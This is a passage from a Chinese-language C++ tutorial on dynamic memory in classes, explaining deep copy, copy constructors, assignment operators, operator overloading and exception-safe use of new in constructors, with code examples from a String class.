或遵循**三/五/零法则 (Rule of Three/Five/Zero)**。如果一个类需要自定义析构函数、复制构造函数或复制赋值运算符中的任何一个，那么它很可能需要自定义所有这三个（C++11 前的三法则）。在 C++11 中，如果需要自定义这三个中的任何一个或移动构造函数/移动赋值运算符，则可能需要考虑所有五个（五法则）。或者，通过使用 RAII（资源获取即初始化）原则和智能指针等现代 C++ 技术，可能可以避免手动管理内存，从而不需要自定义这些特殊成员函数（零法则）。</p><h2 id="12-2-改进后的新-String-类"><a href="#12-2-改进后的新-String-类" class="headerlink" title="12.2 改进后的新 String 类"></a>12.2 改进后的新 String 类</h2><p>上一节我们看到了 <code>StringBad</code> 类的问题：由于它管理动态内存，编译器自动生成的默认复制构造函数和赋值运算符执行的浅复制（只复制指针地址）导致了内存泄漏和重复删除等严重错误。</p><p>为了解决这些问题，我们需要遵循<strong>复制控制</strong>原则（或称三/五法则），为管理动态内存的类提供自定义的特殊成员函数。本节我们创建一个改进的 <code>String</code> 类（放在 <code>string1.h</code> 和 <code>string1.cpp</code> 中），它能正确处理动态内存。</p><p><strong>核心改进：深复制 (Deep Copy)</strong></p><p>关键在于实现<strong>深复制</strong>，而不是浅复制。深复制意味着当复制对象时，不仅复制普通成员的值，还要为指针成员指向的数据分配<strong>新的内存</strong>，并将原始数据<strong>复制</strong>到这块新内存中。</p><p><strong>1. 复制构造函数 (Copy Constructor)</strong></p><p>当一个对象需要通过同类型的另一个对象来初始化时（例如 <code>String s2 = s1;</code> 或按值传递参数），复制构造函数会被调用。我们的自定义版本必须执行深复制：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="comment">// Copy Constructor (Deep Copy)</span></span><br><span class="line">String::String(<span class="keyword">const</span> String &amp; st) &#123;</span><br><span class="line">    num_strings++;              <span class="comment">// 更新静态计数器</span></span><br><span class="line">    len = st.len;               <span class="comment">// 复制长度</span></span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];   <span class="comment">// *** 为新对象分配自己的内存 ***</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);   <span class="comment">// *** 将数据复制到新内存中 ***</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;COPY constructor called for &quot; &lt;&lt; str &lt;&lt; &quot;\n&quot;; // 调试信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，当 <code>String s2 = s1;</code> 执行时，<code>s2</code> 会拥有自己独立的一块内存，其中包含与 <code>s1</code> 相同内容的字符串副本。<code>s1</code> 和 <code>s2</code> 的 <code>str</code> 指针将指向不同的内存地址。</p><p><strong>2. 赋值运算符 (Assignment Operator)</strong></p><p>当将一个已存在的对象赋值给另一个已存在的对象时（例如 <code>s2 = s1;</code>），赋值运算符会被调用。它需要做更多工作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="comment">// Assignment Operator (Deep Copy)</span></span><br><span class="line">String &amp; String::<span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp; st) &#123;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Assignment operator called for &quot; &lt;&lt; str &lt;&lt; &quot;\n&quot;; // 调试信息</span></span><br><span class="line">    <span class="comment">// 1. 自我赋值检查: 防止 obj = obj; 导致意外删除</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;st)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回当前对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 释放旧内存: 释放当前对象 (*this) 原来占用的内存</span></span><br><span class="line">    <span class="keyword">delete</span> [] str;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 深复制: 与复制构造函数类似</span></span><br><span class="line">    len = st.len;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];   <span class="comment">// 分配新内存</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);   <span class="comment">// 复制数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 返回引用: 返回对调用对象 (*this) 的引用，以支持链式赋值 (a = b = c)</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个实现确保了：</p><ul><li>  <strong>自我赋值安全:</strong> 如果尝试 <code>s1 = s1;</code>，操作会直接返回，不会错误地释放内存。</li><li>  <strong>内存管理:</strong> 在复制新数据之前，正确释放了对象原来占用的内存，防止内存泄漏。</li><li>  <strong>深复制:</strong> 为对象分配了新的内存并复制了数据。</li></ul><h3 id="12-2-1-修订后的默认构造函数"><a href="#12-2-1-修订后的默认构造函数" class="headerlink" title="12.2.1 修订后的默认构造函数"></a>12.2.1 修订后的默认构造函数</h3><p>默认构造函数现在创建一个空字符串，而不是像 <code>StringBad</code> 那样创建一个 “C++” 字符串。这通常更有用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line">String::String() &#123;                  <span class="comment">// default constructor</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1</span>];              <span class="comment">// 分配足够存储空字符 &#x27;\0&#x27; 的空间</span></span><br><span class="line">    str[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;                  <span class="comment">// 设置为空字符串</span></span><br><span class="line">    num_strings++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-2-2-比较成员函数"><a href="#12-2-2-比较成员函数" class="headerlink" title="12.2.2 比较成员函数"></a>12.2.2 比较成员函数</h3><p>为了能够比较 <code>String</code> 对象，我们重载了关系运算符 <code>==</code>, <code>&lt;</code>, <code>&gt;</code>。这些通常实现为<strong>友元函数</strong>，因为我们希望能够比较 <code>string1 == string2</code>，并且它们需要访问私有成员 <code>str</code>。我们利用 C 库函数 <code>strcmp()</code> 来进行比较。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt (友元函数定义)</span></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> String &amp;st1, <span class="keyword">const</span> String &amp;st2) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">std</span>::<span class="built_in">strcmp</span>(st1.str, st2.str) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&gt;(<span class="keyword">const</span> String &amp;st1, <span class="keyword">const</span> String &amp;st2) &#123;</span><br><span class="line">    <span class="keyword">return</span> st2 &lt; st1; <span class="comment">// 利用已定义的 operator&lt;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> String &amp;st1, <span class="keyword">const</span> String &amp;st2) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">std</span>::<span class="built_in">strcmp</span>(st1.str, st2.str) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-2-3-使用中括号表示法访问字符"><a href="#12-2-3-使用中括号表示法访问字符" class="headerlink" title="12.2.3 使用中括号表示法访问字符"></a>12.2.3 使用中括号表示法访问字符</h3><p>为了像访问普通 C 字符串数组一样访问 <code>String</code> 对象中的单个字符（例如 <code>myString[0]</code>），我们重载了下标运算符 <code>[]</code>。通常需要提供两个版本：</p><ul><li>  <strong>非 <code>const</code> 版本:</strong> <code>char &amp; operator[](int i);</code> 返回一个 <code>char</code> 的<strong>引用</strong>，允许修改字符（例如 <code>myString[0] = &#39;H&#39;;</code>）。</li><li>  <strong><code>const</code> 版本:</strong> <code>const char &amp; operator[](int i) const;</code> 用于 <code>const</code> String 对象，返回一个 <code>const char</code> 的引用，只允许读取字符（例如 <code>const String greeting = &quot;Hi&quot;; char c = greeting[0];</code>）。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="comment">// read-write char access for non-const String</span></span><br><span class="line"><span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="comment">// 注意：为了简化，这里没有添加边界检查</span></span><br><span class="line">    <span class="keyword">return</span> str[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// read-only char access for const String</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="comment">// 注意：为了简化，这里没有添加边界检查</span></span><br><span class="line">    <span class="keyword">return</span> str[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>实际应用中通常需要添加边界检查（检查 <code>i</code> 是否在 <code>0</code> 到 <code>len-1</code> 的有效范围内）。</em></p><h3 id="12-2-4-静态类成员函数"><a href="#12-2-4-静态类成员函数" class="headerlink" title="12.2.4 静态类成员函数"></a>12.2.4 静态类成员函数</h3><p>我们保留了静态成员 <code>num_strings</code> 和静态成员函数 <code>HowMany()</code> 来跟踪已创建的 <code>String</code> 对象数量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num_strings;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">HowMany</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="keyword">int</span> String::num_strings = <span class="number">0</span>; <span class="comment">// 初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">String::HowMany</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num_strings;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-2-5-进一步重载赋值运算符"><a href="#12-2-5-进一步重载赋值运算符" class="headerlink" title="12.2.5 进一步重载赋值运算符"></a>12.2.5 进一步重载赋值运算符</h3><p>除了从另一个 <code>String</code> 对象赋值，我们通常还希望能够直接从 C 风格字符串 (<code>const char*</code>) 赋值，例如 <code>myString = &quot;Hello&quot;;</code>。为此，我们重载了另一个版本的赋值运算符。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp;); <span class="comment">// String = String</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> <span class="keyword">char</span> *);   <span class="comment">// String = &quot;C-string&quot;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line">String &amp; String::<span class="keyword">operator</span>=(<span class="keyword">const</span> <span class="keyword">char</span> * s) &#123;</span><br><span class="line">    <span class="keyword">delete</span> [] str;                  <span class="comment">// 释放旧内存</span></span><br><span class="line">    len = <span class="built_in">std</span>::<span class="built_in">strlen</span>(s);</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, s);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;                   <span class="comment">// 返回引用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用改进后的 String 类</strong></p><p>现在，使用这个改进后的 <code>String</code> 类（定义在 <code>string1.h</code> 和 <code>string1.cpp</code> 中），之前导致问题的代码可以安全运行了。下面的示例程序 (<code>sayings1.cpp</code>) 展示了如何使用这个类：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sayings1.cpp -- 使用改进的 String 类</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// 使用 string1.h</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> ArSize = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxLen = <span class="number">81</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    String name; <span class="comment">// 调用默认构造函数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hi, what&#x27;s your name?\n&gt;&gt; &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; name; <span class="comment">// 调用 operator&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;, please enter up to &quot;</span> &lt;&lt; ArSize</span><br><span class="line">         &lt;&lt; <span class="string">&quot; short sayings &lt;empty line to quit&gt;:\n&quot;</span>;</span><br><span class="line">    String sayings[ArSize]; <span class="comment">// 调用 ArSize 次默认构造函数</span></span><br><span class="line">    <span class="keyword">char</span> temp[MaxLen];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ArSize; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span>.get(temp, MaxLen); <span class="comment">// 读取一行</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">cin</span> &amp;&amp; <span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// 清除行尾换行符</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">cin</span> || temp[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>) <span class="comment">// 检查空行或输入错误</span></span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// i 未增加</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            sayings[i] = temp; <span class="comment">// 调用 operator=(const char*)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> total = i; <span class="comment">// 记录实际输入的数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (total &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Here are your sayings:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; total; i++)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; sayings[i][<span class="number">0</span>] &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; sayings[i] &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 使用 operator[] 和 operator&lt;&lt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到最短和第一个字母顺序最小的字符串</span></span><br><span class="line">        <span class="keyword">int</span> shortest = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; total; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sayings[i].length() &lt; sayings[shortest].length()) <span class="comment">// 使用 length()</span></span><br><span class="line">                shortest = i;</span><br><span class="line">            <span class="keyword">if</span> (sayings[i] &lt; sayings[first]) <span class="comment">// 使用 operator&lt;</span></span><br><span class="line">                first = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Shortest saying:\n&quot;</span> &lt;&lt; sayings[shortest] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First alphabetically:\n&quot;</span> &lt;&lt; sayings[first] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用复制构造函数</span></span><br><span class="line">        String favorite = sayings[shortest];</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My favorite saying:\n&quot;</span> &lt;&lt; favorite &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This program used &quot;</span> &lt;&lt; String::HowMany() &lt;&lt; <span class="string">&quot; String objects. Bye.\n&quot;</span>; <span class="comment">// 使用 HowMany()</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No input! Bye.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序现在可以正确地创建、复制、赋值和销毁 <code>String</code> 对象，而不会出现内存泄漏或崩溃，因为我们提供了正确的析构函数、复制构造函数和赋值运算符来处理动态内存。</p><h2 id="12-3-在构造函数中使用-new-时应注意的事项"><a href="#12-3-在构造函数中使用-new-时应注意的事项" class="headerlink" title="12.3 在构造函数中使用 new 时应注意的事项"></a>12.3 在构造函数中使用 new 时应注意的事项</h2><p>当类的构造函数使用 <code>new</code> 来分配动态内存时，需要特别注意内存管理和潜在的错误情况，以确保程序的健壮性和避免资源泄漏。</p><h3 id="12-3-1-应该和不应该"><a href="#12-3-1-应该和不应该" class="headerlink" title="12.3.1 应该和不应该"></a>12.3.1 应该和不应该</h3><p><strong>应该做的事:</strong></p><ol><li><p><strong>在析构函数中使用 <code>delete</code>:</strong> 如果构造函数使用 <code>new</code> 分配了内存，那么必须在析构函数中使用 <code>delete</code>（或 <code>delete[]</code> 如果分配的是数组）来释放这些内存。这是防止内存泄漏的基本要求。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> * data;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass(<span class="keyword">size_t</span> n) : size(n) &#123;</span><br><span class="line">        data = <span class="keyword">new</span> <span class="keyword">int</span>[size]; <span class="comment">// 分配内存</span></span><br><span class="line">        <span class="comment">// ... 初始化 data ...</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MyClass constructed, allocated memory.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~MyClass() &#123;</span><br><span class="line">        <span class="keyword">delete</span> [] data; <span class="comment">// *** 必须在析构函数中释放内存 ***</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MyClass destructed, freed memory.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// *** 还需要复制构造函数和赋值运算符 (Rule of Three/Five) ***</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p> <strong>使用 <code>delete[]</code> 释放数组:</strong> 如果构造函数使用 <code>new T[size]</code> 分配了数组，析构函数必须使用 <code>delete[]</code> 来释放。如果使用 <code>new T</code> 分配单个对象，则使用 <code>delete</code>。混用会导致未定义行为。</p></li><li><p> <strong>实现深复制:</strong> 如果类管理动态内存，必须提供自定义的复制构造函数和复制赋值运算符来执行深复制，以避免浅复制带来的问题（如重复删除、悬挂指针）。</p></li></ol><p><strong>不应该做的事 (或需要注意):</strong></p><ol><li><p> <strong>忘记 <code>delete</code>:</strong> 不在析构函数中释放构造函数分配的内存会导致内存泄漏。每次对象销毁时，它占用的动态内存都不会被回收。</p></li><li><p><strong>构造函数中 <code>new</code> 失败:</strong> <code>new</code> 运算符在无法分配所需内存时，默认会抛出 <code>std::bad_alloc</code> 异常。</p><ul><li><p>  如果 <code>new</code> 抛出异常，对象的构造过程会<strong>立即终止</strong>。</p></li><li><p>  重要的是，对象的<strong>析构函数不会被调用</strong>，因为对象从未被完全构造。</p></li><li><p>这意味着，如果在抛出异常的 <code>new</code> 之前，构造函数已经成功分配了<strong>其他</strong>动态资源（例如，通过另一个 <code>new</code>），那么这些资源可能会泄漏，因为没有析构函数来清理它们。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Problematic</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> * data1;</span><br><span class="line">    <span class="keyword">char</span> * data2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Problematic(<span class="keyword">size_t</span> n1, <span class="keyword">size_t</span> n2) : data1(<span class="literal">nullptr</span>), data2(<span class="literal">nullptr</span>) &#123; <span class="comment">// 初始化为 nullptr</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data1 = <span class="keyword">new</span> <span class="keyword">int</span>[n1];</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Allocated data1\n&quot;</span>;</span><br><span class="line">            <span class="comment">// *** 如果下面的 new 失败 ***</span></span><br><span class="line">            data2 = <span class="keyword">new</span> <span class="keyword">char</span>[n2];</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Allocated data2\n&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::bad_alloc &amp; ba) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Memory allocation failed: &quot;</span> &lt;&lt; ba.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// *** 析构函数不会调用，需要在这里手动清理 data1 (如果已分配) ***</span></span><br><span class="line">            <span class="keyword">delete</span> [] data1; <span class="comment">// 如果 data1 分配成功但 data2 失败，需要释放 data1</span></span><br><span class="line">            data1 = <span class="literal">nullptr</span>; <span class="comment">// 避免悬挂指针 (虽然对象构造失败了)</span></span><br><span class="line">            <span class="comment">// 重新抛出异常或处理错误</span></span><br><span class="line">            <span class="keyword">throw</span>; <span class="comment">// 重新抛出，让调用者知道构造失败</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~Problematic() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Problematic destructor called\n&quot;</span>;</span><br><span class="line">        <span class="keyword">delete</span> [] data1;</span><br><span class="line">        <span class="keyword">delete</span> [] data2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ... 复制控制 ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试分配非常大的内存，可能会失败</span></span><br><span class="line">        <span class="function">Problematic <span class="title">p</span><span class="params">(<span class="number">100</span>, <span class="number">1000000000000U</span>LL)</span></span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> 